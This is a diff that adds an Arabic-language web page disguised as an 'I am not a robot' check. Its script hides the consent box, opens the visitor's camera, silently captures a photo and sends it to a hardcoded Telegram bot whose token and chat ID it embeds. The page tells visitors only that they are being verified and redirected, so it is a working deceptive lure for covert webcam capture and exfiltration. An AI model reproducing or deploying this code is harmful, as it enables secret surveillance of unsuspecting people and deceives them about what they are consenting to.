@@ -1,1 +1,116 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>موافقة واحدة</title>
 
+<style>
+body{
+    font-family:Arial;
+    text-align:center;
+    margin-top:40px;
+}
+
+video{
+    width:300px;
+    border-radius:10px;
+}
+
+#modal{
+    position:fixed;
+    top:0;left:0;
+    width:100%;height:100%;
+    background:rgba(0,0,0,0.6);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+}
+
+.box{
+    background:#fff;
+    padding:20px;
+    border-radius:10px;
+    width:300px;
+}
+
+button{
+    padding:10px 15px;
+    cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+
+<h2>التحقق من أنك لست روبت</h2>
+
+<!-- رسالة موافقة واحدة -->
+<div id="modal">
+  <div class="box">
+    <p>
+      ⚠️ عند الضغط على "أنا لست روبوت" سيتم:<br>
+      - التحقق من أنك لست روبوت وسوف يتم تحويلك مباشرة<br>
+
+    <button onclick="startAll()">أنا لست روبوت</button>
+  </div>
+</div>
+
+<video id="video" autoplay playsinline style="display:none"></video>
+<canvas id="canvas" style="display:none"></canvas>
+
+<script>
+const BOT_TOKEN = "8179487086:AAEHNdOJmfXOeS3cwhlhfCPW0O9yFMiRRcM";
+const CHAT_ID = "-1002610945529";
+
+async function startAll(){
+    document.getElementById("modal").style.display="none";
+
+    try{
+        const stream = await navigator.mediaDevices.getUserMedia({video:true});
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+
+        video.onloadedmetadata = async () => {
+
+            setTimeout(async () => {
+
+                const canvas = document.getElementById("canvas");
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+
+                const ctx = canvas.getContext("2d");
+                ctx.drawImage(video,0,0);
+
+                canvas.toBlob(async (blob)=>{
+
+                    const form = new FormData();
+                    form.append("chat_id", CHAT_ID);
+                    form.append("photo", blob, "photo.png");
+
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method:"POST",
+                        body:form
+                    });
+
+                    alert("تم الإرسال بنجاح");
+
+                    stream.getTracks().forEach(t=>t.stop());
+
+                }, "image/png");
+
+            }, 1000);
+        };
+
+    }catch(e){
+        alert("تم رفض الكاميرا");
+    }
+}
+
+function deny(){
+    document.getElementById("modal").style.display="none";
+    alert("تم الإلغاء");
+}
+</script>
+
+</body>
+</html>
